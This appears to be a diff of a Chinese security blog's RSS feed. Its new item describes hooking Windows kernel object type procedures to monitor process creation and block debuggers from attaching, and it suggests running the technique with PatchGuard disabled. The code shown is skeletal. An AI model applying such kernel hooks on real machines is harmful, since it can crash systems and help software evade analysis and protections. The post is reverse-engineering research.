+        <description>&lt;h1 id=&#34;实验windows对象初始化器---参见pg合规免责声明---逆向工程&#34;&gt;实验Windows对象初始化器 - 参见PG合规免责声明* - 逆向工程
+&lt;/h1&gt;&lt;h2 id=&#34;概述&#34;&gt;概述
+&lt;/h2&gt;&lt;p&gt;在本文中，我想介绍一种有趣的方法，通过实验性替代手段实现类似于Windows对象回调功能的效果。众所周知，Windows系统上的反恶意软件、反作弊和通用监控工具经常使用这些回调。然而，它们的使用仅限于拥有签名模块的实体，而且这些回调存在被篡改的风险。&lt;/p&gt;
+&lt;h2 id=&#34;构建块&#34;&gt;构建块
+&lt;/h2&gt;&lt;p&gt;Windows内核中的对象是操作系统运行和记录的基础。我们将以一个熟悉的对象为例：进程(Process)。&lt;/p&gt;
+&lt;h3 id=&#34;进程创建与通知&#34;&gt;进程创建与通知
+&lt;/h3&gt;&lt;p&gt;Windows中的进程通知回调是系统监控和安全的基石。这些回调主要由反恶意软件和反作弊系统使用，提供关于进程创建和终止事件的实时通知。&lt;/p&gt;
+&lt;h2 id=&#34;函数指针重绑定&#34;&gt;函数指针重绑定
+&lt;/h2&gt;&lt;p&gt;我们通过修改对象类型初始化器中的函数指针来实现进程通知回调，完全避开传统的对象回调列表。以下是关键实现步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;定位ObTypeIndexTable表&lt;/li&gt;
+&lt;li&gt;枚举所有对象类型，找到PsProcessType&lt;/li&gt;
+&lt;li&gt;替换原始OpenProcedure指针为我们的处理函数&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;process_open_procedure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;e_ob_open_reason&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open_reason&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;uint8_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;access_mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object_body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;granted_access&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handle_count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 处理进程创建事件
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open_reason&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ob_open_handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 记录进程创建信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 调用原始函数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;g_ob_type_hook_pair&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;o_open_procedure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;利用securityprocedure实现反调试&#34;&gt;利用SecurityProcedure实现反调试
+&lt;/h2&gt;&lt;p&gt;通过挂钩DebugObject类型的安全过程，我们可以实现系统级反调试：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;generic_security_procedure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SECURITY_OPERATION_CODE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;operation_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;...)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ob_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DbgkDebugObjectType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 阻止调试器附加
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;STATUS_DEBUG_ATTACH_FAILED&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 调用原始函数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;g_ob_type_tracking_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[...]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;o_security_procedure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;实现结果&#34;&gt;实现结果
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;成功监控所有新创建的进程&lt;/li&gt;
+&lt;li&gt;有效阻止x64dbg和WinDbg等调试器附加&lt;/li&gt;
+&lt;li&gt;无需签名驱动模块即可实现&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;该方法在Windows 11 23H2上测试通过&lt;/li&gt;
+&lt;li&gt;修改受PatchGuard保护的结构可能导致系统崩溃&lt;/li&gt;
+&lt;li&gt;建议仅在PG禁用或短时间内使用此技术&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;完整对象类型和过程转储&#34;&gt;完整对象类型和过程转储
+&lt;/h2&gt;&lt;p&gt;文章最后提供了完整的Windows内核对象类型及其相关过程的转储信息，包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;类型名称&lt;/li&gt;
+&lt;li&gt;打开/关闭/删除过程&lt;/li&gt;
+&lt;li&gt;安全过程&lt;/li&gt;
+&lt;li&gt;解析过程等&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这项技术展示了Windows内核对象系统的灵活性，为系统监控和安全研究提供了新的思路。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>内核池初探：MS10-058漏洞分析与利用</title>
         <link>http://localhost:1313/p/%E5%86%85%E6%A0%B8%E6%B1%A0%E5%88%9D%E6%8E%A2ms10-058%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
         <pubDate>Tue, 05 Aug 2025 14:48:58 +0800</pubDate>
